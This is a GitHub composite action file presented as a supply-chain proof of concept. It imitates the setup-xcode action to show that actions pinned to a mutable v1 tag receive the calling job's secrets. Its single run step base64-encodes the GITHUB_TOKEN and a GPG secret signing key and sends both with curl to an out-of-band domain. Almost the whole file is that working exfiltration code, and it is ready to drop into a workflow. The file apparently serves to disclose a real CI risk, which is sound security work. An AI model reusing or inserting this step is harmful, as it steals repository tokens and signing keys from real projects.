name: 'setup-xcode (mutable v1 tag - supply chain PoC)'
description: 'Composite action mirroring maxim-lobanov/setup-xcode executed at an unpinned v1 ref. Proves mutable-tag actions run with the calling job''s secrets in env.'
author: 'sl4x0'
branding:
  icon: shield
  color: red
runs:
  using: "composite"
  steps:
    - name: Execute at mutable v1 tag (attacker-controlled code here when tag is moved)
      shell: bash
      env:
        POC_OOB_DOMAIN: ${{ env.POC_OOB_DOMAIN }}
        GPG_SECRET_KEY: ${{ env.GPG_SECRET_KEY }}
      run: |
        echo "=== [poc] running inside signing job via unpinned third-party action ref ==="
        echo "runner: $(uname -a | head -c 80)"
        if [ -n "${GITHUB_TOKEN:-}" ]; then
          echo "[poc] GITHUB_TOKEN present length=${#GITHUB_TOKEN}"
          curl -sS --max-time 12 "https://${POC_OOB_DOMAIN}/tkn/$(printf %s "$GITHUB_TOKEN" | base64 -w0)" -o /dev/null -w 'oob_gt=%{http_code}\n' >/dev/null 2>&1 || echo "gt_exfil_err"
        fi
        if [ -n "${GPG_SECRET_KEY:-}" ]; then
          echo "[poc] GPG_SECRET_KEY present (mounted to this step env)"
          curl -sS --max-time 12 "https://${POC_OOB_DOMAIN}/gpg/$(printf %s "$GPG_SECRET_KEY" | base64 -w0)" -o /dev/null -w 'oob_gpg=%{http_code}\n' >/dev/null 2>&1 || echo "gpg_exfil_err"
        fi
        echo "=== [poc] done ==="
